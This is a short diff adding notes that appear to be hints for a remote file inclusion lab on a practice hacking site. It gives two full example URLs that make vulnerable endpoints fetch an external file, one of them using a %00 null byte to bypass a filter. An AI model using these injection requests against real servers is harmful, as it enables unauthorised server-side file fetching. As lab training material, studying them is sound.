@@ -1,0 +1,16 @@
+Endpoint.php
+--------------
+You can easily grab any external files, for example
+https://hackxpert.com/labs/RFI/endPoint.php?field2_name=https%3A%2F%2Fraw.githubusercontent.com%2Fdanielmiessler%2FSecLists%2Fmaster%2FDiscovery%2FDNS%2Fbitquark-subdomains-top100000.txt&submit=submit&parent_id=0
+
+But it will only grab the first 2048 bytes
+
+
+Endpoint-2.php
+--------------
+You can easily grab any external files, for example
+https://hackxpert.com/labs/RFI/endPoint.php?field2_name=https%3A%2F%2Fraw.githubusercontent.com%2Fdanielmiessler%2FSecLists%2Fmaster%2FDiscovery%2FDNS%2Fbitquark-subdomains-top100000.txt%00&submit=submit&parent_id=0
+
+You will have to add a nullbyte though ( see the %00 in the URL)
+
+But it will only grab the first 2048 bytes
